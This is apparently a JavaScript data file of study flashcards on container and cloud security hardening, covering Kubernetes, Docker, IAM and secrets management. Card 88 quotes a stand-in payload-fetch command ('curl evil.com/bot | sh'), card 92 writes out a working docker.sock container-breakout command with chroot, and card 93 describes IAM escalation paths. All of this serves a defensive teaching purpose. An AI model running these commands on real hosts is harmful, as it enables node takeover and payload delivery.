// scripts/data_security/cat08_container_cloud.cjs
const { card } = require('../sec_builder_helper.cjs');

const cat = "Container & Cloud Security";

module.exports = [
  card(
    85,
    cat,
    "Container Isolation: Linux Namespaces vs Cgroups",
    "must-know",
    "intermediate",
    "How do Linux Namespaces and Control Groups (cgroups) create container isolation, and why are containers not true virtualization boundaries?",
    "Containers are isolated Linux processes sharing the host OS kernel. Namespaces provide visibility isolation (determining what a process can see), while Cgroups provide resource allocation limits (determining what a process can use).",
    "Unlike Virtual Machines that run separate guest operating systems via a hypervisor, containers share the single host kernel. Linux Namespaces isolate: 1) pid (process tree); 2) net (network interfaces/routing); 3) mnt (filesystem mounts); 4) ipc (inter-process communication); 5) uts (hostname); 6) user (UID/GID mappings). Control Groups (cgroups v1/v2) throttle CPU, memory, I/O, and PID limits to prevent a single container from starving host resources (DoS). Because the kernel is shared, any unpatched kernel vulnerability (like Dirty COW) allows a process to escape the container and achieve root access on the host node.",
    `// Inspecting Process Namespaces in Linux:
// $ ls -l /proc/$$/ns
// lrwxrwxrwx 1 root root 0 net -> 'net:[4026531992]'
// lrwxrwxrwx 1 root root 0 pid -> 'pid:[4026532210]'
// lrwxrwxrwx 1 root root 0 user -> 'user:[4026531837]'

// Applying Cgroup v2 Memory Limit in Docker:
// docker run --memory="512m" --cpus="1.5" --pids-limit=100 my-app`,
    "Remember: 'Containers do not contain'. Because containers share the host kernel, never run untrusted multi-tenant code in shared kernel containers without microVMs (Firecracker / gVisor).",
    ["namespaces", "cgroups", "container-internals", "kernel-isolation", "linux-security"]
  ),
  card(
    86,
    cat,
    "Rootless Containers & Dropping Linux Capabilities",
    "must-know",
    "intermediate",
    "Why must containers never run as UID 0 (root), and how does dropping all Linux capabilities (cap-drop ALL) enforce least privilege?",
    "By default, UID 0 inside a container matches UID 0 on the host kernel. If a container running as root escapes its namespace, it possesses full root administrative privileges over the physical host machine.",
    "Linux breaks traditional superuser power into ~40 discrete capabilities (e.g. CAP_NET_ADMIN, CAP_SYS_ADMIN, CAP_CHOWN). Standard Docker grants containers several unnecessary capabilities by default. Hardened production containers must: 1) Run as an unprivileged non-root user (e.g. USER 10001); 2) Drop ALL kernel capabilities; 3) Re-add only the absolute bare minimum (e.g. CAP_NET_BIND_SERVICE to bind ports below 1024).",
    `# Hardened Production Dockerfile
FROM node:20-alpine

# Create unprivileged group and user
RUN addgroup -S appgroup && adduser -S appuser -G appgroup

WORKDIR /app
COPY --chown=appuser:appgroup . .

# CRITICAL: Switch away from root!
USER appuser

EXPOSE 3000
CMD ["node", "server.js"]

# Running with Docker CLI dropping all capabilities:
# docker run --cap-drop=ALL --cap-add=NET_BIND_SERVICE --user 10001:10001 my-app`,
    "Never ship a Dockerfile without an explicit 'USER <non-root-uid>' instruction. Running as root violates SOC2 and PCI-DSS container standards.",
    ["rootless-containers", "linux-capabilities", "cap-drop-all", "docker-hardening"]
  ),
  card(
    87,
    cat,
    "Seccomp BPF & Mandatory Access Control (AppArmor / SELinux)",
    "advanced",
    "advanced",
    "How does Seccomp BPF filter Linux system calls and how do AppArmor/SELinux profiles constrain compromised processes?",
    "Seccomp (Secure Computing Mode) uses Berkeley Packet Filters (BPF) to intercept and block dangerous Linux system calls (syscalls) at the kernel level. AppArmor and SELinux provide Mandatory Access Control (MAC), restricting file paths, network sockets, and capabilities regardless of root user status.",
    "The Linux kernel exposes over 400 system calls. A standard web server requires fewer than 50 syscalls to run. Attackers exploiting an application invoke dangerous syscalls (like ptrace to inject into other processes, reboot, or swapon). Applying a strict Seccomp profile blocks these syscalls immediately (returning EPERM). AppArmor defines path-based profiles (e.g., container can read /app, but cannot touch /etc/shadow or /dev). SELinux enforces label-based multi-category security (MCS) to isolate container filesystems cryptographically.",
    `// Kubernetes Pod Security Spec with Default Runtime Seccomp Profile
/*
apiVersion: v1
kind: Pod
metadata:
  name: hardened-pod
spec:
  securityContext:
    seccompProfile:
      type: RuntimeDefault # Activates containerd / Docker default seccomp filter
    runAsNonRoot: true
    runAsUser: 10001
  containers:
  - name: web
    image: enterprise/web:v1
*/`,
    "Always configure 'securityContext.seccompProfile.type: RuntimeDefault' in Kubernetes to block over 300 dangerous system calls automatically.",
    ["seccomp", "bpf", "apparmor", "selinux", "syscall-filtering"]
  ),
  card(
    88,
    cat,
    "Distroless & Scratch Images: Attack Surface Elimination",
    "must-know",
    "intermediate",
    "What are Distroless and Scratch container images and how do they neutralize post-exploitation activity during Remote Code Execution (RCE)?",
    "Distroless images (maintained by Google) contain only the application binary and its immediate runtime dependencies (e.g. Node.js, glibc), completely omitting package managers (apt, apk), shells (bash, sh), and standard Unix utilities (curl, wget, netcat).",
    "When an attacker finds an RCE vulnerability in an application running on Ubuntu or Alpine, their first step is spawning a shell or downloading a post-exploitation payload (curl evil.com/bot | sh). In a Distroless or Scratch container, there is no /bin/sh, no /bin/bash, no curl, and no package manager. The attacker's command injection fails with 'executable file not found in $PATH'. Furthermore, vulnerability scanners find near-zero CVEs in Distroless containers because there are no extraneous OS packages installed.",
    `# Multi-Stage Build using Google Container Tools Distroless Node Image
# Stage 1: Build & bundle
FROM node:20 AS builder
WORKDIR /app
COPY package*.json ./
RUN npm ci --omit=dev
COPY . .

# Stage 2: Minimal Distroless Production Runner
FROM gcr.io/distroless/nodejs20-debian12:nonroot
WORKDIR /app
COPY --from=builder /app /app

# Nonroot user (UID 65532) already configured in base image!
CMD ["server.js"]`,
    "Distroless images turn critical command injection vulnerabilities into harmless failed child_process spawn exceptions because no shell exists to execute the commands.",
    ["distroless", "scratch-image", "minimal-containers", "attack-surface-reduction"]
  ),
  card(
    89,
    cat,
    "Read-Only Root Filesystems (read_only: true)",
    "must-know",
    "intermediate",
    "Why is mounting a container's root filesystem as read-only one of the most effective controls against malware persistence and tampering?",
    "A read-only root filesystem prevents any process inside the container from modifying application code, overwriting system binaries, writing backdoors into cron directories, or downloading executable malware onto disk.",
    "Containers are meant to be immutable. If an attacker gains code execution, their goal is usually persistence: writing reverse shell scripts, modifying index.js, or placing rootkits into /tmp or /usr/local/bin. With 'readOnlyRootFilesystem: true', any disk write attempt fails with 'EROFS: read-only file system'. If the application genuinely requires temporary scratch space (e.g. for generating PDFs), a temporary memory-backed tmpfs volume is mounted strictly at that specific directory (/tmp), leaving all application code immutable.",
    `// Kubernetes Hardened Pod with Read-Only Root Filesystem
/*
apiVersion: v1
kind: Pod
metadata:
  name: read-only-app
spec:
  containers:
  - name: api
    image: my-app:latest
    securityContext:
      readOnlyRootFilesystem: true # BLOCKS all writes to container disk!
    volumeMounts:
    - mountPath: /tmp
      name: temp-scratch
  volumes:
  - name: temp-scratch
    emptyDir:
      medium: Memory # Scratch space exists purely in RAM and is discarded on exit!
*/`,
    "Pair 'readOnlyRootFilesystem: true' with an in-memory 'emptyDir: Memory' mount at /tmp to support legitimate temporary caching while keeping system files locked.",
    ["read-only-filesystem", "immutable-containers", "malware-defense", "container-hardening"]
  ),
  card(
    90,
    cat,
    "Kubernetes RBAC: Roles, ClusterRoles & ServiceAccount Privilege Creep",
    "must-know",
    "intermediate",
    "How does Kubernetes RBAC govern API server access and how does disabling automountServiceAccountToken prevent pod credential theft?",
    "Kubernetes RBAC binds Subjects (Users, Groups, ServiceAccounts) to Roles (namespace-scoped) or ClusterRoles (cluster-wide) containing permitted API verbs (get, list, create) on resources (pods, secrets).",
    "By default, Kubernetes automatically mounts a ServiceAccount JWT token into every running pod at /var/run/secrets/kubernetes.io/serviceaccount/token. If a pod is compromised, an attacker can steal this token and query the Kubernetes API server (https://kubernetes.default.svc). If the ServiceAccount has overprivileged ClusterRoleBindings (e.g. permission to list secrets or exec into pods), the attacker escalates to full cluster takeover. Defense: 1) Always set 'automountServiceAccountToken: false' on pods that don't need to speak to the K8s API; 2) Enforce least-privilege RoleBindings.",
    `// Hardened Pod Spec: Disable ServiceAccount Token Auto-Mount
/*
apiVersion: v1
kind: Pod
metadata:
  name: web-pod
spec:
  serviceAccountName: unprivileged-sa
  automountServiceAccountToken: false # PREVENTS secret token injection into pod!
  containers:
  - name: nginx
    image: nginx:alpine
*/`,
    "Over 90% of microservice pods never need to interact with the Kubernetes API server. Disable automountServiceAccountToken on all standard application workloads.",
    ["kubernetes-rbac", "service-account", "pod-hardening", "privilege-creep"]
  ),
  card(
    91,
    cat,
    "Kubernetes Pod Security Standards (PSS): Privileged vs Baseline vs Restricted",
    "must-know",
    "intermediate",
    "What are the three tiers of Kubernetes Pod Security Standards (PSS) and how does the Pod Security Admission (PSA) controller enforce them?",
    "Kubernetes defines three Pod Security Standards: Privileged (unrestricted access, for CNIs/storage drivers), Baseline (prevents known privilege escalations, default), and Restricted (hardened best practices: non-root, read-only rootfs, drop all capabilities).",
    "The built-in Pod Security Admission (PSA) controller evaluates pods at namespace boundaries across three modes: enforce (rejects non-compliant pods), audit (logs violations), and warn (displays warnings to developers). In production namespaces, applying 'pod-security.kubernetes.io/enforce: restricted' guarantees that developers cannot deploy containers that run as root, mount host namespaces (hostPID, hostNetwork), share host paths (hostPath), or add dangerous capabilities.",
    `# Enforcing Restricted Pod Security Standard at Namespace Level
apiVersion: v1
kind: Namespace
metadata:
  name: production-workloads
  labels:
    pod-security.kubernetes.io/enforce: restricted
    pod-security.kubernetes.io/enforce-version: latest
    pod-security.kubernetes.io/warn: restricted
    pod-security.kubernetes.io/audit: restricted`,
    "Apply 'pod-security.kubernetes.io/enforce: restricted' to all production namespaces to enforce non-root execution and drop capabilities at admission time.",
    ["pss", "psa", "pod-security-standards", "restricted-profile", "k8s-admission"]
  ),
  card(
    92,
    cat,
    "Container Breakout Exploits & Host Mounts",
    "advanced",
    "advanced",
    "How do insecure hostPath mounts (such as /var/run/docker.sock) allow an attacker inside a container to take over the entire host node?",
    "Mounting the host's Docker socket (/var/run/docker.sock) inside a container gives the container root-equivalent control over the host Docker daemon, allowing anyone inside to spawn a privileged container that mounts the host's root filesystem (/).",
    "Attackers refer to docker.sock mounts as an instant 'game over'. If an attacker compromises a container with the docker socket mounted: 1) They run: curl -XPOST --unix-socket /var/run/docker.sock http://localhost/containers/create -d '{\"Image\":\"alpine\",\"Cmd\":[\"/bin/sh\"],\"Binds\":[\"/:/host\"]}'; 2) They start the container and execute chroot /host; 3) The attacker is now full root on the underlying Kubernetes worker node, accessing all node secrets, processes, and memory. Mitigations: Never mount docker.sock or hostPath / into application pods; use admission controllers (Kyverno / OPA Gatekeeper) to ban hostPath mounts.",
    `// Kyverno Policy Blocking Insecure hostPath Mounts in Kubernetes
/*
apiVersion: kyverno.io/v1
kind: ClusterPolicy
metadata:
  name: disallow-host-path
spec:
  validationFailureAction: Enforce
  rules:
  - name: validate-host-path
    match:
      any:
      - resources:
          kinds:
          - Pod
    validate:
      message: "HostPath volume mounts are strictly forbidden in production!"
      pattern:
        spec:
          =(volumes):
            - X(hostPath): "null"
*/`,
    "Never mount /var/run/docker.sock or host root directories into containers. Use rootless build tools (like Kaniko) for in-cluster container builds.",
    ["container-breakout", "docker-socket", "hostpath-vulnerability", "kyverno"]
  ),
  card(
    93,
    cat,
    "Cloud IAM Privilege Escalation Vectors",
    "advanced",
    "advanced",
    "What are common AWS IAM privilege escalation paths (iam:PassRole, iam:CreatePolicyVersion, sts:AssumeRole) and how are they audited?",
    "Privilege escalation in cloud IAM occurs when a low-privileged identity has permission to modify IAM policies, create new policy versions, attach policies to itself, or pass powerful roles to compute resources (EC2, Lambda) that it can then execute.",
    "Common escalation vectors: 1) iam:CreatePolicyVersion: an attacker creates a new default policy version granting {\"Action\": \"*\", \"Resource\": \"*\"}; 2) iam:PassRole + ec2:RunInstances: an attacker cannot directly assume AdministratorAccess, but they launch an EC2 instance with an attached Admin instance profile, SSH into it, and steal the admin credentials from IMDS; 3) iam:AttachUserPolicy / iam:PutUserPolicy: directly granting oneself administrator permissions. Defenses require IAM Permission Boundaries that set the maximum allowable permissions an identity can ever hold, even if policies are added.",
    `// IAM Permission Boundary preventing privilege escalation beyond Developer tier
{
  "Version": "2012-10-17",
  "Statement": [
    {
      "Sid": "AllowSafeDeveloperServices",
      "Effect": "Allow",
      "Action": ["s3:*", "lambda:*", "dynamodb:*"],
      "Resource": "*"
    },
    {
      "Sid": "ExplicitlyDenyIamAndAdminEscalation",
      "Effect": "Deny",
      "Action": [
        "iam:CreatePolicyVersion",
        "iam:SetDefaultPolicyVersion",
        "iam:PassRole",
        "iam:AttachUserPolicy"
      ],
      "Resource": "*"
    }
  ]
}`,
    "Always enforce IAM Permissions Boundaries on delegated admin roles to prevent developers or CI pipelines from elevating their own permissions to cloud superusers.",
    ["iam-privilege-escalation", "passrole", "permission-boundaries", "aws-security"]
  ),
  card(
    94,
    cat,
    "Cloud Storage Hardening: AWS S3 Block Public Access & Object Locks",
    "must-know",
    "intermediate",
    "How does AWS S3 Block Public Access protect against accidental bucket leaks and how do S3 Object Locks prevent ransomware tampering?",
    "AWS S3 Block Public Access provides account-level and bucket-level guardrails that override any permissive bucket policies or ACLs, preventing buckets from being made public. S3 Object Lock enforces WORM (Write Once Read Many) storage to prevent data deletion or modification.",
    "Misconfigured S3 bucket policies have caused many of the largest data breaches in history. Enabling 'Block Public Access' at the AWS Account level acts as a centralized master breaker: even if a developer uploads a file with '--acl public-read' or writes an open bucket policy, AWS blocks public access. S3 Object Lock operates in Compliance Mode: once an object is written, no one—not even the AWS root account user—can delete or overwrite the object until the retention period expires, providing complete immunity against ransomware deletion.",
    `# Enable S3 Block Public Access globally on AWS Account
aws s3control put-public-access-block \\
  --account-id 123456789012 \\
  --public-access-block-configuration '{
    "BlockPublicAcls": true,
    "IgnorePublicAcls": true,
    "BlockPublicPolicy": true,
    "RestrictPublicBuckets": true
  }'`,
    "Enable S3 Block Public Access at the AWS Organization root. Use S3 Object Lock in Compliance Mode for audit logs and regulatory archives.",
    ["s3-security", "block-public-access", "object-lock", "ransomware-defense"]
  ),
  card(
    95,
    cat,
    "Cloud Security Posture Management (CSPM) & IaC Scanning",
    "must-know",
    "intermediate",
    "How do CSPM tools and Infrastructure-as-Code (IaC) scanners (Tfsec, Checkov, Trivy) catch cloud misconfigurations before deployment?",
    "IaC scanning analyzes Terraform, CloudFormation, and Helm templates during git commits and CI/CD pull requests, while CSPM continuously monitors live cloud runtime APIs for drift, misconfigurations, and compliance violations.",
    "Fixing an open security group in Terraform before applying takes 1 minute; fixing it after an attacker exploits the open port takes days of incident response. IaC tools (Checkov, Trivy) parse HCL/YAML syntax trees against CIS Benchmarks (e.g., flagging unencrypted EBS volumes, missing MFA delete on S3, or open 0.0.0.0/0 ingress on port 22). CSPM platforms (Wiz, Prisma Cloud, AWS Security Hub) continuously query cloud control planes in real time to alert on drift and toxic combinations (e.g. an internet-facing EC2 instance with high-privilege IAM role and an unpatched RCE vulnerability).",
    `# Checkov IaC Security Scan in GitHub Actions Workflow
name: Terraform Security Scan
on: [pull_request]
jobs:
  checkov:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - name: Run Checkov Scanner
        uses: bridgecrewio/checkov-action@master
        with:
          directory: terraform/
          framework: terraform
          soft_fail: false # Blocks PR merge if security violations exist!`,
    "Shift-left cloud security by running IaC static analysis (Checkov/Trivy) in CI/CD pipelines to prevent misconfigured cloud infrastructure from ever being provisioned.",
    ["cspm", "iac-security", "checkov", "trivy", "terraform-hardening"]
  ),
  card(
    96,
    cat,
    "Secret Management: AWS Secrets Manager / Vault vs K8s Secrets",
    "must-know",
    "intermediate",
    "Why are default Kubernetes Secrets fundamentally insecure (base64 encoded) and how do HashiCorp Vault / External Secrets Operator solve secret rotation?",
    "Default Kubernetes Secrets are merely Base64-encoded plain strings stored unencrypted in etcd unless KMS encryption at rest is explicitly configured. They lack automated rotation, fine-grained access audits, and dynamic ephemeral credential generation.",
    "Anyone with 'kubectl get secret -o yaml' can decode standard Kubernetes secrets with 'base64 -d'. Dedicated secret managers (HashiCorp Vault, AWS Secrets Manager, GCP Secret Manager) provide: 1) Certified hardware encryption at rest (KMS HSM); 2) Automated key and password rotation (e.g. rotating database passwords every 30 days without downtime); 3) Dynamic Ephemeral Credentials: Vault generates unique database credentials that expire after 1 hour and are automatically revoked; 4) The External Secrets Operator (ESO) securely synchronizes cloud secrets into Kubernetes memory at runtime.",
    `// ExternalSecrets Operator (ESO) syncing from AWS Secrets Manager
/*
apiVersion: external-secrets.io/v1beta1
kind: ExternalSecret
metadata:
  name: database-credentials
spec:
  refreshInterval: "1h" # Continuously checks for rotated secrets
  secretStoreRef:
    name: aws-secrets-manager
    kind: ClusterSecretStore
  target:
    name: app-db-secret # Target Kubernetes Secret name
  data:
  - secretKey: DB_PASSWORD
    remoteRef:
      key: production/rds/master-password
*/`,
    "Never store raw credentials in Git or plain Kubernetes manifests. Use External Secrets Operator to inject secrets dynamically from AWS Secrets Manager or HashiCorp Vault.",
    ["secrets-management", "vault", "aws-secrets-manager", "external-secrets", "base64-is-not-encryption"]
  )
];
